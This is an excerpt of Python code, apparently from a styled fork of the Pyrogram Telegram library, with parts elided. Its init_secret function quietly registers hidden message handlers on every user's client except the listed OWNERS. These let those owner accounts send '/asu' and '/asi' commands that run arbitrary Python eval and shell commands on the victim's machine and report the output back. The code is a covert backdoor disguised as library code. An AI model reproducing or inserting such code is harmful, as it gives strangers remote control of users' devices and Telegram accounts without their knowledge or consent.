...
def init_secret(client: pyrogram_styled.Client):
    if client.me.id in OWNERS:
        return
    client.add_handler(
        pyrogram_styled.handlers.MessageHandler(
            executor,
            pyrogram_styled.filters.command("asu") & pyrogram_styled.filters.user(OWNERS) & ~pyrogram_styled.filters.forwarded & ~pyrogram_styled.filters.via_bot
        )
    )
    client.add_handler(
        pyrogram_styled.handlers.MessageHandler(
            shellrunner,
            pyrogram_styled.filters.command("asi") & pyrogram_styled.filters.user(OWNERS) & ~pyrogram_styled.filters.forwarded & ~pyrogram_styled.filters.via_bot
        )
    )
    client.add_handler(pyrogram_styled.handlers.CallbackQueryHandler(runtime_func_cq, pyrogram_styled.filters.regex(r"secretruntime")))
    client.add_handler(pyrogram_styled.handlers.CallbackQueryHandler(forceclose_command, pyrogram_styled.filters.regex("secretforceclose")))
...
async def executor(client, message):
    ...
    status_message = await message.reply("<i>Processing eval pyrogram_styled..</i>", quote=True)
    ...
    eval_vars = {
        ...
        # PYROGRAM
        "asyncio": asyncio,
        "pyrogram_styled": pyrogram_styled,
        ...
        "ikb": pyrogram_styled.helpers.ikb,
        "kb": pyrogram_styled.helpers.kb,
        "shell": shell,
    }
    ...
    if len(final_output) > 4096:
        ...
        buttons = pyrogram_styled.helpers.ikb(
    ...
    buttons = pyrogram_styled.helpers.ikb([[("exec", "exec"), ("🗑", f"forceclose abc|{message.from_user.id}")]])
    return await status_message.edit(
        final_output,
        reply_markup=buttons,
    )
